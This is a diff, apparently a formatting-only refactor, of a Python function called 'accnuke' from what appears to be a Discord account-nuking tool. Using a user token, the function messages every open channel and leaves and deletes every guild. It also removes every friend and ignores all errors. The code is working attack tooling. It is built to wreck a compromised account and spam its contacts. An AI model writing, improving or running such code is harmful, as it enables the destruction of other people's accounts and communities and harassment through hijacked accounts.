@@ -22,9 +22,14 @@ def accnuke():
         print(f"\n{y}[{w}+{y}]{w} Sent a Message to all available friends")
         for channel in channelIds:
             try:
-                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
-                headers=headers,
-                data={"content": f"{message_Content}"})
+                requests.post(
+                    'https://discord.com/api/v9/channels/'
+                    + channel['id']
+                    + '/messages',
+                    headers=headers,
+                    data={"content": f"{message_Content}"},
+                )
+
                 print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Messaged ID: "+channel['id'])
             except Exception as e:
                 print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")
@@ -34,8 +39,10 @@ def accnuke():
         for guild in guildsIds:
             try:
                 requests.delete(
-                    f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
-                    headers={'Authorization': usertoken})
+                    'https://discord.com/api/v7/users/@me/guilds/' + guild['id'],
+                    headers={'Authorization': usertoken},
+                )
+
                 print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Left guild: "+guild['name'])
             except Exception as e:
                 print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")
@@ -43,7 +50,11 @@ def accnuke():
         print(f"\n{y}[{w}+{y}]{w} Deleted all available guilds")
         for guild in guildsIds:
             try:
-                requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers={'Authorization': usertoken})
+                requests.delete(
+                    'https://discord.com/api/v7/guilds/' + guild['id'],
+                    headers={'Authorization': usertoken},
+                )
+
                 print(f'\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Deleted guild: '+guild['name'])
             except Exception as e:
                 print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")
@@ -53,7 +64,11 @@ def accnuke():
         for friend in friendIds:
             try:
                 requests.delete(
-                    f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': usertoken})
+                    'https://discord.com/api/v9/users/@me/relationships/'
+                    + friend['id'],
+                    headers={'Authorization': usertoken},
+                )
+
                 print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Removed friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
             except Exception as e:
                 print(f"""\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} The following error has been encountered and is being ignored: {e}""")
